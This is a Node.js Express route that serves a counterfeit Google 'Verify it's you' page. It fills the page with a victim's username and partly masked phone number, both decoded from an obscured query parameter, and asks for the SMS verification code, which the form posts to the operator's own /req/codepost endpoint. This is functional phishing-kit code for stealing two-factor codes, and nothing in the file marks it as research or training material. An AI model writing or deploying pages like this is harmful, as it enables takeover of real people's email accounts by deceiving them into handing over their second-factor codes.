
const express = require ('express');
const { copyFileSync } = require('fs');
const router = express.Router();

router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation


router.get('/', async (req, res) => {


    const data6 = req.query.dfgfhtuyghnbcgferfh;
    const dataArray1 = data6.split('/');
    const userid = dataArray1[0];
    const mobNumber = dataArray1[1];
    const username = Buffer.from(userid, 'base64').toString('utf-8');
    const mobile = Buffer.from(mobNumber, 'base64').toString('utf-8');
    const mobNumberStr = mobile.toString(); // Convert to string
    const hiddenMobNumber = mobNumberStr.slice(10);


    console.log(mobile);


     
  

    if (username == null) {
        res.render('error');
    
      }else{

    const htmlContent = `
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <link rel="shortcut icon" href="/images/gmail.ico" type="image/x-icon">
    <link rel="stylesheet" href="/stylesheet/newstyle1.css">
    <script src="https://code.iconify.design/3/3.1.0/iconify.min.js"></script>
</head>
<body>
    <div class="maindiv">
        <form class="loginform1" method="post" name="loginForm" action="/req/codepost" accept-charset="UTF-8">
       
            <div class="form-half">
                <div><img class="divlogo" src="/images/image.png" ></div><br>
                <div><span class="welcome">Verify it's you<span></div><br>
                <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in<span><button id="myButton" class="hyperl1" ><b>Learn more</b></button></div>                
                <div class="userdiv">
                  <img class="left-img"  src="/images/user-circle.png" >&nbsp;&nbsp;
                  <input type='hidden' name="username" id="useRname" value="${username}">
                  <span style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${username}</span>&nbsp;
                  <img class="right-img" src="/images/dropd.jpg">
                  
                </div>
            </div>
            <div class="form-half1">
                <center>
                    <div class="gradient-box"><img src="/images/account-recovery-sms-pin.gif"></div>
                </center>
                    <div class="phonediv">
                      <span class="phonetype">Enter a verification code</span><br><br>
                      <span class="messaged"> A text message with a verification code was just sent to your mobile *******${hiddenMobNumber}.</i></span>
                        
                    </div>
                    <div class="codediv">
                        <div class="input-prefix-wrap">
                        <span class="prefix">G - </span>
                        <input  required='' name="code" type='text' id="pEyar">
                        <label style="color:#2c2a2a;; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Enter code' placeholder='Enter Code'></label></div></div>
                

                <div class="tryn1">
                    <button id="myButton" class="hyperl2" ><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
                    <button type="submit" class="btnnxt">Submit</button>
                   
                    </script>
                    
                  </div>

            </div>

           
      
        </form>
        <div class="btmdiv">
            <div class="left-div">
                <select class="btmhypl" id="language-select">
                    <option value="en">English (United States)</option>
                    <option value="fr">French</option>
                    <option value="es">Spanish</option>
                    <option value="de">German</option>
                    <!-- Add more options as needed -->
                </select>
            </div>
            <div class="right-divs">
                <div class="right-div">
                    <button id="myButton" class="btmhypl" >Help</button>
                </div>
                <div class="right-div">
                    <button id="myButton" class="btmhypl" >Privacy</button>
                </div>
                <div class="right-div">
                    <button id="myButton" class="btmhypl" >Terms</button>
                </div>
            </div>
        </div>
        <script>
            // JavaScript to redirect on button click
            document.getElementById("myButton").onclick = function () {
                location.href = "https://mail.google.com"; // Replace "https://example.com" with your desired URL
            };
        </script>

    </div>
    
</body>
</html>
    `;

    // Send the HTML content as a response
     res.send(htmlContent);

            } 

});

    

module.exports =router;